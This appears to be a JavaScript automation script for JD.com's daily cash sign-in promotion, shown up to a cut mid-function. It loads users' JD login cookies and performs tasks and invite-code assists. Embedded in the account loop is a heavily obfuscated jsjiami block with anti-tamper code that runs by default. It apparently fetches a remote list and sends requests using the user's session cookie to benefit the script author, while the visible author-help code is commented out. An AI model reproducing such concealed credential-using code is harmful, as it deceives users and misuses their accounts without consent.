
/*
签到领现金，每日2毛～5毛
可互助，助力码每日不变，只变日期
活动入口：京东APP搜索领现金进入
已支持IOS双京东账号,Node.js支持N个京东账号
脚本兼容:QuantumultX,Surge,Loon,JSBox,Node.js
============Quantumultx===============
[task_local]
#签到领现金
2 0 * * * https://raw.githubusercontent.com/shuye72/MyActions/main/scripts/jd_cash.js, tag=签到领现金, enabled=true

================Loon==============
[Script]
cron "2 0 * * *" script-path=https://raw.githubusercontent.com/shuye72/MyActions/main/scripts/jd_cash.js,tag=签到领现金

===============Surge=================
签到领现金 = type=cron,cronexp="2 0 * * *",wake-system=1,timeout=20,script-path=https://raw.githubusercontent.com/shuye72/MyActions/main/scripts/jd_cash.js

============小火箭=========
签到领现金 = type=cron,script-path=https://raw.githubusercontent.com/shuye72/MyActions/main/scripts/jd_cash.js, cronexpr="2 0 * * *", timeout=200, enable=true
 */
const $ = new Env('签到领现金');
const notify = $.isNode() ? require('./sendNotify') : '';
//Node.js用户请在jdCookie.js处填写京东ck;
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
let jdNotify = true;//是否关闭通知，false打开通知推送，true关闭通知推送
//IOS等用户直接用NobyDa的jd cookie
let cookiesArr = [], cookie = '', message;
let helpAuthor = true;
const inviteCodes = [
  ``,
  ``
]
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  })
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
  let cookiesData = $.getdata('CookiesJD') || "[]";
  cookiesData = jsonParse(cookiesData);
  cookiesArr = cookiesData.map(item => item.cookie);
  cookiesArr.reverse();
  cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
  cookiesArr.reverse();
  cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
}
const JD_API_HOST = 'https://api.m.jd.com/client.action';
!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  await requireConfig()
  await getAuthorShareCode();
  for (let i = 0; i < cookiesArr.length; i++) {
    if (cookiesArr[i]) {
      cookie = cookiesArr[i];
      $.UserName = decodeURIComponent(cookie.match(/pt_pin=(.+?);/) && cookie.match(/pt_pin=(.+?);/)[1])
      $.index = i + 1;
      $.isLogin = true;
      $.nickName = '';
      message = '';
      await TotalBean();
      var _0xodY='jsjiami.com.v6',_0x2a1c=[_0xodY,'wqXCscO2woLDsMKiBMKEwrk3woLDvWY=','KRwu','w4LClhN2FcKoO0fCnMKNwqzCmMOn','w7HClw3DqsKq','wrXDoMOHJFY=','wrrCpsOswoXDvMKmEcKewrYk','wrhLw4nDgmRCw7U=','wpTDksK8Dn8=','UwnClsKPwonDs8OR','wpHDkcOgCHw=','w6nCkSlpEQ==','XCXCnWdewrPCqsO/wox0wq5ow7PDtl43wpLDn8Kkw6FYN8Kvw7tXw5/Cm05Pw5lWw4Q0AsKiwrfDn8Ohw6jCtsKiwrPCpcOKRsKDH8KWOGwrOMKfWUXCucKDI8OvNgN5OA7CrCbDnmAxwqHCuShrdcKbKsKowpt6ecKow7k=','Gyg6wq3CvQ==','worCmcOTw4YeworClMOSwpI5wowLcMK8QMKIJU1mw6t1w4tqRMKIexbDpWTDnMKuw7ViwqQ2PsKswqzCujDDkMO/w7LDvlnCtSzDmxFVwqfDjMOZZMOwwo7DnsKBcQ==','WsOnw7lUw47CsBvCmMOXwpJrwox0N8Osc8OIMkLCjH/DkxTCpsOTe8OVD8Oqbi46JFnDki0rwoHCsX59wqDCrGFxwrzCs27CrBLCjAgSw7NdGsKrwovDn8KD','PT/CgB0=','X8Kkw4N3LhfCkHZiJsOLwqPCulbDnnU7P8KswojClmrDs8O6VsOeWsOqcsOKDzUdwq3DlnFuaMKKw5sVwo7Dighsw6DDgcOdw5jDnDZBVTXDu8OEexlDcQXCncOSwpRAJlTClg==','eQPCmMKCwoTDq8ORbMKMIwbCtcK3QMKzw5TDv3tQLMK8wo/Ckl/Ct8K3OyRQf8KQE8K4DsOObMKLwqVmZX0UVz4ZHcKcMMOww4PDmMOmwpTCrkM3LsKfwoPDjwIHwp4TTFbDgcOnw4nDvMK0RAHCvkgNwr/DtsOMWjdbwpUTwrciw6QSIMKQwo7DlmtOw7ctUcKAwrjCqiTDj8OABMK9IcKew5fDvWLCnmYTwop8wp7CvcKUwr0mwp1Aw7nDs8KcZh85V8Ozw7bDjTbClMOqw67CvsOpThxSCBjCjcOEEsO+LTkAa8K2wofDiy3DgQ==','w47Dm8Obaho=','wqdKw5LDqEg=','w6dLJcKswro=','w7c0PQ==','w7o2B07CqA==','H8KkdcOuSQ==','w5hWw51rwpdzYw==','w4dDJcKxWA==','w7UnAQFI','KTHChwhvwq8d','w7oiEyBTOMO0E8OQwrg=','wqRHwrJow4Zw','wpksIsOFew==','w7zDssOESBJbIg==','wqTCg8OUw5Raw6zDi8Oxw4Vm','w6xLVcOkwpQs','M8KJe8O7dMOyCA==','wodOwoNXwqhrUMK5elc=','A8Kbwo7DsA==','egDCsHNb','w7XDrDdRIyHCr8ODw6XCqMOYwrg=','HsKlwrsdwpXCkF/DnsKMwptqw49gdcOsV8OXcFTDhj/CjBzDoMOgJ8KVU8OKJHhtMA==','w5E0fB/CrsKveMKeP8OudcKuQyzCkmnCj8OyTsO6w45N','VGgAwo/CkMOdwokwwrfDrMKDwrIYw5XCp8OOwqs=','XcOsMcOvw7JABi8XNQ==','RcOPag==','w5vCmcKvOl7CtRUPwp51Uj5n','wqLCssOiw74=','wqFfwoFMwqETUcKIYFXDiysUwpEcOxzDl8OuccKrwrnCmUvDkxtpfhA8N8KLwrkZdMOOFHo+w7p8dAoCRzVIKcKHCsOrw5QZw5lXw7/Ds8Kxw4MlE243w7RHw4Zrw6nDsMO8w7jCkcK5asKWw6XCmQ==','SMKyw5xVFg==','wp7DkUbDpcK7wrx2PcOI','wo9Wwrpzwpw=','HMKOwpPDtGh0dMKnO8KmcAfCucOGwpJqKMKEY2E8wozClMK0c33ClGEOQxJKJsKowrttwrVew5NRwqxTccOvw4pGFFF+w5HDtcKAQgLCscOrwqIeb8O4EsOlGBnCk8Ozwr3CosO0wrLCoDzCvHLCtMKSwpXDnSXDuhHChCEhw57Cj1Jnw5ArccKsw6vCqcKPQ8O+wqnDo3Q8WMOtE3U0aMKIw7vDh8KSP1PDjsKrQGzDn1IXMwTDuTV7wpTCgCzDgsOUw6rCp3LDgkR6woXCoVMCw6tcJEjDkcK5woMnP8OyLS3DpVXDrl4=','CMK0wp3DqcOV','esKnw69eNQ==','w6HDgsKww7rCkA==','NcKqBAdC','FSDDvUnDlw==','wrlYwoN6wr8=','wqFRwpJgw5Z9','wo3CmMOB','hejsbROjiIEIamiDO.comlg.vV6yf=='];(function(_0x2396aa,_0x1ad349,_0x183b73){var _0x37de69=function(_0xb4a009,_0x79df7c,_0x557ccf,_0x1128b7,_0xdc2489){_0x79df7c=_0x79df7c>>0x8,_0xdc2489='po';var _0x41d7f9='shift',_0x275020='push';if(_0x79df7c<_0xb4a009){while(--_0xb4a009){_0x1128b7=_0x2396aa[_0x41d7f9]();if(_0x79df7c===_0xb4a009){_0x79df7c=_0x1128b7;_0x557ccf=_0x2396aa[_0xdc2489+'p']();}else if(_0x79df7c&&_0x557ccf['replace'](/[hebROIEIDOlgVyf=]/g,'')===_0x79df7c){_0x2396aa[_0x275020](_0x1128b7);}}_0x2396aa[_0x275020](_0x2396aa[_0x41d7f9]());}return 0x75642;};var _0x379baa=function(){var _0x15a0f7={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x491b10,_0x1c1e14,_0x46571d,_0x20c869){_0x20c869=_0x20c869||{};var _0x37e46b=_0x1c1e14+'='+_0x46571d;var _0xf8c675=0x0;for(var _0xf8c675=0x0,_0x4c5967=_0x491b10['length'];_0xf8c675<_0x4c5967;_0xf8c675++){var _0x57eea6=_0x491b10[_0xf8c675];_0x37e46b+=';\x20'+_0x57eea6;var _0x441fe6=_0x491b10[_0x57eea6];_0x491b10['push'](_0x441fe6);_0x4c5967=_0x491b10['length'];if(_0x441fe6!==!![]){_0x37e46b+='='+_0x441fe6;}}_0x20c869['cookie']=_0x37e46b;},'removeCookie':function(){return'dev';},'getCookie':function(_0x2e4298,_0xdae1ec){_0x2e4298=_0x2e4298||function(_0x30ee5b){return _0x30ee5b;};var _0x10883f=_0x2e4298(new RegExp('(?:^|;\x20)'+_0xdae1ec['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0xb4b977=typeof _0xodY=='undefined'?'undefined':_0xodY,_0x468a9f=_0xb4b977['split'](''),_0x1719b8=_0x468a9f['length'],_0x204d08=_0x1719b8-0xe,_0x24ecf5;while(_0x24ecf5=_0x468a9f['pop']()){_0x1719b8&&(_0x204d08+=_0x24ecf5['charCodeAt']());}var _0x152e6e=function(_0x2e01ab,_0x4371bc,_0x4a4d93){_0x2e01ab(++_0x4371bc,_0x4a4d93);};_0x204d08^-_0x1719b8===-0x524&&(_0x24ecf5=_0x204d08)&&_0x152e6e(_0x37de69,_0x1ad349,_0x183b73);return _0x24ecf5>>0x2===0x14b&&_0x10883f?decodeURIComponent(_0x10883f[0x1]):undefined;}};var _0x1e2977=function(){var _0xd3ed18=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0xd3ed18['test'](_0x15a0f7['removeCookie']['toString']());};_0x15a0f7['updateCookie']=_0x1e2977;var _0x113340='';var _0x46c722=_0x15a0f7['updateCookie']();if(!_0x46c722){_0x15a0f7['setCookie'](['*'],'counter',0x1);}else if(_0x46c722){_0x113340=_0x15a0f7['getCookie'](null,'counter');}else{_0x15a0f7['removeCookie']();}};_0x379baa();}(_0x2a1c,0x9c,0x9c00));var _0x4475=function(_0x212302,_0x90c353){_0x212302=~~'0x'['concat'](_0x212302);var _0x120b6a=_0x2a1c[_0x212302];if(_0x4475['RZpJqt']===undefined){(function(){var _0x385ba5;try{var _0x5c6cf6=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x385ba5=_0x5c6cf6();}catch(_0x2bb657){_0x385ba5=window;}var _0x1f7840='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x385ba5['atob']||(_0x385ba5['atob']=function(_0x1c8e48){var _0xff9b92=String(_0x1c8e48)['replace'](/=+$/,'');for(var _0x4ef4ca=0x0,_0x59ff08,_0x2055fb,_0x2a743d=0x0,_0x39a39d='';_0x2055fb=_0xff9b92['charAt'](_0x2a743d++);~_0x2055fb&&(_0x59ff08=_0x4ef4ca%0x4?_0x59ff08*0x40+_0x2055fb:_0x2055fb,_0x4ef4ca++%0x4)?_0x39a39d+=String['fromCharCode'](0xff&_0x59ff08>>(-0x2*_0x4ef4ca&0x6)):0x0){_0x2055fb=_0x1f7840['indexOf'](_0x2055fb);}return _0x39a39d;});}());var _0x4d6053=function(_0x3277c4,_0x90c353){var _0xc42699=[],_0x5bc1e3=0x0,_0x308d00,_0x137d19='',_0x317df4='';_0x3277c4=atob(_0x3277c4);for(var _0x3d353d=0x0,_0x5463bc=_0x3277c4['length'];_0x3d353d<_0x5463bc;_0x3d353d++){_0x317df4+='%'+('00'+_0x3277c4['charCodeAt'](_0x3d353d)['toString'](0x10))['slice'](-0x2);}_0x3277c4=decodeURIComponent(_0x317df4);for(var _0x4d48c2=0x0;_0x4d48c2<0x100;_0x4d48c2++){_0xc42699[_0x4d48c2]=_0x4d48c2;}for(_0x4d48c2=0x0;_0x4d48c2<0x100;_0x4d48c2++){_0x5bc1e3=(_0x5bc1e3+_0xc42699[_0x4d48c2]+_0x90c353['charCodeAt'](_0x4d48c2%_0x90c353['length']))%0x100;_0x308d00=_0xc42699[_0x4d48c2];_0xc42699[_0x4d48c2]=_0xc42699[_0x5bc1e3];_0xc42699[_0x5bc1e3]=_0x308d00;}_0x4d48c2=0x0;_0x5bc1e3=0x0;for(var _0x1bab79=0x0;_0x1bab79<_0x3277c4['length'];_0x1bab79++){_0x4d48c2=(_0x4d48c2+0x1)%0x100;_0x5bc1e3=(_0x5bc1e3+_0xc42699[_0x4d48c2])%0x100;_0x308d00=_0xc42699[_0x4d48c2];_0xc42699[_0x4d48c2]=_0xc42699[_0x5bc1e3];_0xc42699[_0x5bc1e3]=_0x308d00;_0x137d19+=String['fromCharCode'](_0x3277c4['charCodeAt'](_0x1bab79)^_0xc42699[(_0xc42699[_0x4d48c2]+_0xc42699[_0x5bc1e3])%0x100]);}return _0x137d19;};_0x4475['MxUXdx']=_0x4d6053;_0x4475['bnwDeg']={};_0x4475['RZpJqt']=!![];}var _0x560099=_0x4475['bnwDeg'][_0x212302];if(_0x560099===undefined){if(_0x4475['OgATaW']===undefined){var _0x3c7dea=function(_0x4aada7){this['nYvNDb']=_0x4aada7;this['ghIqyV']=[0x1,0x0,0x0];this['lwgumk']=function(){return'newState';};this['ejAGwG']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['vWugKu']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x3c7dea['prototype']['PvxWNr']=function(){var _0x226e3c=new RegExp(this['ejAGwG']+this['vWugKu']);var _0x5df980=_0x226e3c['test'](this['lwgumk']['toString']())?--this['ghIqyV'][0x1]:--this['ghIqyV'][0x0];return this['YUVXii'](_0x5df980);};_0x3c7dea['prototype']['YUVXii']=function(_0x432b63){if(!Boolean(~_0x432b63)){return _0x432b63;}return this['oIcViG'](this['nYvNDb']);};_0x3c7dea['prototype']['oIcViG']=function(_0x4eda92){for(var _0x4cef46=0x0,_0x44bf1d=this['ghIqyV']['length'];_0x4cef46<_0x44bf1d;_0x4cef46++){this['ghIqyV']['push'](Math['round'](Math['random']()));_0x44bf1d=this['ghIqyV']['length'];}return _0x4eda92(this['ghIqyV'][0x0]);};new _0x3c7dea(_0x4475)['PvxWNr']();_0x4475['OgATaW']=!![];}_0x120b6a=_0x4475['MxUXdx'](_0x120b6a,_0x90c353);_0x4475['bnwDeg'][_0x212302]=_0x120b6a;}else{_0x120b6a=_0x560099;}return _0x120b6a;};if(helpAuthor){shuye72();function help(_0x245433){var _0x3a0f0b={'DmZOM':function(_0x1df550,_0x4fce5b){return _0x1df550+_0x4fce5b;},'XEyov':_0x4475('0','&KT1'),'MwXYh':_0x4475('1','i7RL'),'LqITw':_0x4475('2','gfM0'),'ZJDQZ':_0x4475('3','5y!)'),'TTDex':_0x4475('4','O@Ra'),'rccFn':_0x4475('5','$Yt4'),'hMNOs':function(_0xcd78c5,_0x36b7e9){return _0xcd78c5(_0x36b7e9);},'EUaKN':_0x4475('6','Va2P'),'adFgd':_0x4475('7','VAS#'),'aCeJW':_0x4475('8','y4I!'),'WZbzE':_0x4475('9','$]8T')};let _0x216de8=+new Date();let _0x4f73b6=_0x245433[_0x4475('a','CFjt')];let _0x4f5ecd={'url':_0x3a0f0b[_0x4475('b','y4I!')](_0x4475('c','p[sn'),_0x216de8),'headers':{'Host':_0x3a0f0b[_0x4475('d','f$n6')],'Content-Type':_0x3a0f0b[_0x4475('e','Zm*c')],'origin':_0x3a0f0b[_0x4475('f','7FXy')],'Accept-Encoding':_0x3a0f0b[_0x4475('10','$Yt4')],'Cookie':cookie,'Connection':_0x3a0f0b[_0x4475('11','2h1C')],'Accept':_0x3a0f0b[_0x4475('12','y4I!')],'User-Agent':$[_0x4475('13','t$Wb')]()?process[_0x4475('14','VAS#')][_0x4475('15','0)ex')]?process[_0x4475('16','[nk#')][_0x4475('17','3fb8')]:_0x3a0f0b[_0x4475('18','Fwg[')](require,_0x3a0f0b[_0x4475('19','k[L@')])[_0x4475('1a','0)ex')]:$[_0x4475('1b','^**t')](_0x3a0f0b[_0x4475('1c','Va2P')])?$[_0x4475('1d','Sr[*')](_0x3a0f0b[_0x4475('1e','k[L@')]):_0x3a0f0b[_0x4475('1f','3fb8')],'referer':_0x4475('20','soht')+_0x4f73b6,'Accept-Language':_0x3a0f0b[_0x4475('21','[nk#')]},'body':_0x4475('22','VAS#')+_0x4f73b6+_0x4475('23','i7RL')};$[_0x4475('24','ZhJ^')](_0x4f5ecd,(_0xdd92c1,_0x21725b,_0x43136b)=>{});}function shuye72(){var _0x454b74=function(){var _0x17be57=!![];return function(_0xd7819e,_0x4e1c72){var _0xdd51d3=_0x17be57?function(){if(_0x4e1c72){var _0x129e07=_0x4e1c72['apply'](_0xd7819e,arguments);_0x4e1c72=null;return _0x129e07;}}:function(){};_0x17be57=![];return _0xdd51d3;};}();var _0x4c7ee1=_0x454b74(this,function(){var _0x3063da=function(){return'\x64\x65\x76';},_0x19fe90=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0xca32c6=function(){var _0x145a02=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x145a02['\x74\x65\x73\x74'](_0x3063da['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x12b737=function(){var _0x3b88db=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x3b88db['\x74\x65\x73\x74'](_0x19fe90['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x1a8489=function(_0x3df93e){var _0x125786=~-0x1>>0x1+0xff%0x0;if(_0x3df93e['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x125786)){_0x13cf5e(_0x3df93e);}};var _0x13cf5e=function(_0x2fc4d3){var _0x4fc11a=~-0x4>>0x1+0xff%0x0;if(_0x2fc4d3['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x4fc11a){_0x1a8489(_0x2fc4d3);}};if(!_0xca32c6()){if(!_0x12b737()){_0x1a8489('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x1a8489('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x1a8489('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0x4c7ee1();var _0x16d9b2={'VHkCO':function(_0x3ba56d,_0x480dfc){return _0x3ba56d!==_0x480dfc;},'xdoNM':function(_0x419fc3,_0x4d94fc){return _0x419fc3<_0x4d94fc;},'vBgGO':function(_0x2e482a,_0x5e3a28){return _0x2e482a(_0x5e3a28);},'jgNWo':_0x4475('25','Zm*c'),'HLztz':_0x4475('26','Sr[*')};new Promise(_0x21d6b4=>{var _0x2f811e={'CpqJb':function(_0x4cb38c,_0x3a5a52){return _0x16d9b2[_0x4475('27','Bvy2')](_0x4cb38c,_0x3a5a52);},'uYdEf':function(_0x14b515,_0x1acf50){return _0x16d9b2[_0x4475('28','^**t')](_0x14b515,_0x1acf50);},'NQYdv':function(_0x311bb9,_0x4ef914){return _0x16d9b2[_0x4475('29','tVo&')](_0x311bb9,_0x4ef914);}};$[_0x4475('2a','D[TJ')]({'url':_0x16d9b2[_0x4475('2b','D[TJ')],'headers':{'User-Agent':_0x16d9b2[_0x4475('2c','e7]k')]}},async(_0x47de0a,_0x1dfaf7,_0x475131)=>{if(_0x475131){$[_0x4475('2d','zVEQ')]=JSON[_0x4475('2e','TdIC')](_0x475131);if(_0x2f811e[_0x4475('2f','SU7g')]($[_0x4475('30','ZhJ^')][_0x4475('31','SU7g')][_0x4475('32','t$Wb')],0x0)){for(let _0x3a269d=0x0;_0x2f811e[_0x4475('33','6XtH')](_0x3a269d,$[_0x4475('34','Bvy2')][_0x4475('35','VAS#')][_0x4475('36','zC&F')]);_0x3a269d++){let _0x531eee=$[_0x4475('37','e7]k')][_0x4475('38','y4I!')][_0x3a269d];await $[_0x4475('39','p[sn')](0x2bc);_0x2f811e[_0x4475('3a','soht')](help,_0x531eee);}}}});});}};_0xodY='jsjiami.com.v6';
      console.log(`\n******开始【京东账号${$.index}】${$.nickName || $.UserName}*********\n`);
      if (!$.isLogin) {
        $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

        if ($.isNode()) {
          await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
        }
        continue
      }
      await jdCash()
    }
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })
async function jdCash() {
  await index()
  await shareCodesFormat()
  await helpFriends()
  await index(true)
  // await getReward()
  await showMsg()
}
function index(info=false) {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_mob_home",), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if(data.code===0 && data.data.result){
              if(info){
                message += `当前现金：${data.data.result.signMoney}`
                return
              }
              console.log(`您的助力码为${data.data.result.inviteCode}`)
              let helpInfo = {
                'inviteCode': data.data.result.inviteCode,
                'shareDate': data.data.result.shareDate
              }
              $.shareDate = data.data.result.shareDate;
              $.log(`shareDate: ${$.shareDate}`)
              // console.log(helpInfo)
              for(let task of data.data.result.taskInfos){
                if (task.type === 4) {
                  for (let i = task.doTimes; i < task.times; ++i) {
                    console.log(`去做${task.name}任务 ${i+1}/${task.times}`)
                    await doTask(task.type, task.jump.params.skuId)
                    await $.wait(5000)
                  }
                }
                else if (task.type === 2) {
                  for (let i = task.doTimes; i < task.times; ++i) {
                    console.log(`去做${task.name}任务 ${i+1}/${task.times}`)
                    await doTask(task.type, task.jump.params.shopId)
                    await $.wait(5000)
                  }
                }
                else if (task.type === 16 || task.type===3 || task.type===5 || task.type===17 || task.type===21) {
                  for (let i = task.doTimes; i < task.times; ++i) {
                    console.log(`去做${task.name}任务 ${i+1}/${task.times}`)
                    await doTask(task.type, task.jump.params.url)
                    await $.wait(5000)
                  }
                }
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
async function helpFriends() {
  $.canHelp = true
  for (let code of $.newShareCodes) {
    console.log(`去帮助好友${code['inviteCode']}`)
    await helpFriend(code)
    if(!$.canHelp) break
    await $.wait(1000)
  }
  // if (helpAuthor && $.authorCode) {
  //   for(let helpInfo of $.authorCode){
  //     console.log(`去帮助好友${helpInfo['inviteCode']}`)
  //     await helpFriend(helpInfo)
  //     if(!$.canHelp) break
  //     await $.wait(1000)
  //   }
  // }
}
function helpFriend(helpInfo) {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_mob_assist", {...helpInfo,"source":1}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if( data.code === 0 && data.data.bizCode === 0){
              console.log(`助力成功，获得${data.data.result.cashStr}`)
              // console.log(data.data.result.taskInfos)
            } else if (data.data.bizCode===207){
              console.log(data.data.bizMsg)
              $.canHelp = false
            } else{
              console.log(data.data.bizMsg)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function doTask(type,taskInfo) {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_doTask",{"type":type,"taskInfo":taskInfo}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if( data.code === 0){
              console.log(`任务完成成功`)
              // console.log(data.data.result.taskInfos)
            }else{
              console.log(data)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}
function getReward() {
  return new Promise((resolve) => {
    $.get(taskUrl("cash_mob_reward",{"source":1,"rewardNode":""}), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if( data.code === 0 && data.data.bizCode === 0 ){
              console.log(`领奖成功，${data.data.result.shareRewardTip}【${data.data.result.shareRewardAmount}】`)
              // console.log(data.data.result.taskInfos)
            }else{
              console.log(`领奖失败，${data.data.bizMsg}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function showMsg() {
  return new Promise(resolve => {
    if (!jdNotify) {
      $.msg($.name, '', `${message}`);
    } else {
      $.log(`京东账号${$.index}${$.nickName}\n${message}`);
    }
    resolve()
  })
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://gitee.com/Soundantony/RandomShareCode/raw/master/JD_Cash.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/updateTeam/master/shareCodes/jd_updateCash.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
//格式化助力码
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${$.shareCodesArr[$.index - 1]}`)
    $.newShareCodes = [];
    if ($.shareCodesArr[$.index - 1]) {
      $.newShareCodes = $.shareCodesArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > inviteCodes.length ? (inviteCodes.length - 1) : ($.index - 1);
      $.newShareCodes = inviteCodes[tempIndex].split('@');
      let authorCode = deepCopy($.authorCode)
      $.newShareCodes = [...(authorCode.map((item, index) => authorCode[index] = item['inviteCode'])), ...$.newShareCodes];
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      $.newShareCodes = [...new Set([...$.newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    $.newShareCodes.map((item, index) => $.newShareCodes[index] = { "inviteCode": item, "shareDate": $.shareDate })
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify($.newShareCodes)}`)
    resolve();
  })
}

function requireConfig() {
  return new Promise(resolve => {
    console.log(`开始获取${$.name}配置文件\n`);
    let shareCodes = [];
    if ($.isNode()) {
      if (process.env.JD_CASH_SHARECODES) {
        if (process.env.JD_CASH_SHARECODES.indexOf('\n') > -1) {
          shareCodes = process.env.JD_CASH_SHARECODES.split('\n');
        } else {
          shareCodes = process.env.JD_CASH_SHARECODES.split('&');
        }
      }
    }
    console.log(`共${cookiesArr.length}个京东账号\n`);
    $.shareCodesArr = [];
    if ($.isNode()) {
      Object.keys(shareCodes).forEach((item) => {
        if (shareCodes[item]) {
          $.shareCodesArr.push(shareCodes[item])
        }
      })
    }
    console.log(`您提供了${$.shareCodesArr.length}个账号的${$.name}助力码\n`);
    resolve()
  })
}
function deepCopy(obj) {
  let objClone = Array.isArray(obj) ? [] : {};
  if (obj && typeof obj === "object") {
    for (let key in obj) {
      if (obj.hasOwnProperty(key)) {
        //判断ojb子元素是否为对象，如果是，递归复制
        if (obj[key] && typeof obj[key] === "object") {
          objClone[key] = deepCopy(obj[key]);
        } else {
          //如果不是，简单复制
          objClone[key] = obj[key];
        }
      }
    }
  }
  return objClone;
}
function taskUrl(functionId, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${functionId}&body=${escape(JSON.stringify(body))}&appid=CashRewardMiniH5Env&appid=9.1.0`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Connection': 'keep-alive',
      'Content-Type': 'application/json',
      'Referer': 'http://wq.jd.com/wxapp/pages/hd-interaction/index/index',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
      'Accept-Language': 'zh-cn',
      'Accept-Encoding': 'gzip, deflate, br',
    }
  }
}

function getAuthorShareCode() {
  return new Promise(resolve => {
    $.get({url: "https://gitee.com/Soundantony/updateTeam/raw/master/shareCodes/jd_updateCash.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      $.authorCode = [];
      try {
        if (err) {
        } else {
          $.authorCode = JSON.parse(data)
        }
      } catch (e) {
